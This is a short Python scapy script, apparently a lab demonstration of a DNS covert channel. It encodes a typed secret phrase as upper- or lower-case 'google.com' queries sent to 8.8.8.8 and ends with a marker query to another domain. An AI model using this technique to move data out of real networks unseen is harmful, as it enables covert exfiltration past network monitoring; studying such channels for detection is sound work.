from scapy.all import *
from time import sleep

IP_DST = "8.8.8.8"
DOMAIN = "google.com"

# Get user input
user_input = input("Enter your secret phrase: ")

# Convert user input to binary
bin_user_input = ''.join(format(ord(i), 'b').zfill(8) for i in user_input)

# Create IP packet
p = IP(dst=IP_DST)/UDP(dport=53)/DNS(rd=1, qd=DNSQR())

# Loop through binary version of user input and send case modulated queries
for i in bin_user_input:

    if i == '0':
        p["DNSQR"].qname = "google.com"
        send(p, verbose=False)

    elif i == '1':
        p["DNSQR"].qname = "GOOGLE.COM"
        send(p, verbose=False)

    # sleep(0.5)

# Signal end of transmission
p["DNSQR"].qname = "ourgourdandsavior.com"
send(p)
